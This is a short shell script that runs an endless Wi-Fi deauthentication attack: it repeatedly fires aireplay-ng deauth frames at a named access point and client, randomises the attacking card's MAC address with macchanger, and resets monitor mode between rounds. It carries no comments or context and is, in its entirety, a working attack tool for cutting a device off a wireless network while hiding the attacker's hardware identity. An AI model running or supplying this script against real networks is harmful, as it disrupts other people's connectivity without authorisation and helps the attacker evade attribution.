#!/bin/sh

while true
do
	aireplay-ng -0 5 -a XX:XX:XX:79:3B:71 -c YY:YY:YY:05:8C:0C wlp3s0
	iwconfig wlp3s0 channel 6
	ifconfig wlp3s0 down
	macchanger -r wlp3s0 | grep "New MAC"

	iwconfig wlp3s0 mode monitor
	ifconfig wlp3s0 up
	iwconfig wlp3s0 | grep Mode
	
	sleep 3
	echo Waiting!!!
done
